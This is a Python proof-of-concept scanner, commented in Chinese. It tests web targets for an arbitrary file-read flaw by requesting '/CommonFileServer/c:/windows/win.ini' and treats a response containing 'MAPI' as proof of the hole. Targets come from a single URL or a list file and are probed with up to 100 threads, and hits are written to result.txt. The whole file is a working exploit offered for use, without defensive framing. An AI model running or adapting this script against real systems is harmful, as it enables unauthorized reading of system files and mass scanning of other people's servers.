import argparse  # 用于解析命令行参数
import sys  # 提供对解释器使用或影响解释器的函数和变量的访问
import requests  # 用于发送HTTP请求
import re  # 正则表达式模块，用于字符串匹配和操作
import time  # 提供时间相关的功能
from multiprocessing.dummy import Pool  # 使用线程池来并行处理任务
requests.packages.urllib3.disable_warnings()  # 禁用requests库中的警告

def main():
    # 创建ArgumentParser对象，用于解析命令行参数
    parser = argparse.ArgumentParser(description="J_C")
    # 添加两个命令行参数：-u（--url）和-f（--file）
    parser.add_argument('-u', '--url', dest='url', type=str, help="input link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="file path")
    # 解析命令行参数
    args = parser.parse_args()

    # 如果提供了url参数但没有提供file参数
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了file参数但没有提供url参数
    elif not args.url and args.file:
        url_list = []  # 初始化一个列表用于存储从文件中读取的URL
        # 打开并读取文件
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                # 去除每行末尾的换行符并添加到url_list中
                url_list.append(i.strip().replace('\n',''))
        # 创建一个线程池，最大线程数为100
        mp = Pool(100)
        # 使用线程池并行处理URL列表中的每个URL
        mp.map(poc, url_list)
        mp.close()  # 关闭线程池
        mp.join()  # 等待所有线程完成
    else:
        # 如果既没有提供url参数也没有提供file参数，则打印用法提示
        print(f"Usage:\n\t python3 {sys.argv[0]} -h ")

def poc(target):
    # 构建测试漏洞的URL路径
    payload_url = '/CommonFileServer/c:/windows/win.ini'
    url = target + payload_url
    # 设置请求头
    header = {
        'accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    try:
        # 发送GET请求以检查目标URL是否可访问
        res1 = requests.get(url=target, headers=header, timeout=10)
        if res1.status_code == 200:
            # 如果GET请求成功，发送POST请求以进一步验证是否存在漏洞
            res2 = requests.post(url=url, headers=header, timeout=10)
            # 检查响应内容是否包含"MAPI"，以确定是否存在漏洞
            if "MAPI" in res2.text:
                print(f'[+] 该URL存在漏洞,地址为{target}')
                # 如果存在漏洞，将该URL写入result.txt文件
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + "\n")
            else:
                print(f'[-] 该URL{target}不存在漏洞')
    except Exception as e:
        # 如果请求过程中出现异常，提示用户手工测试
        print(f'[*] 该URL{target}存在访问问题，请手工测试')

if __name__ == '__main__':
    main()
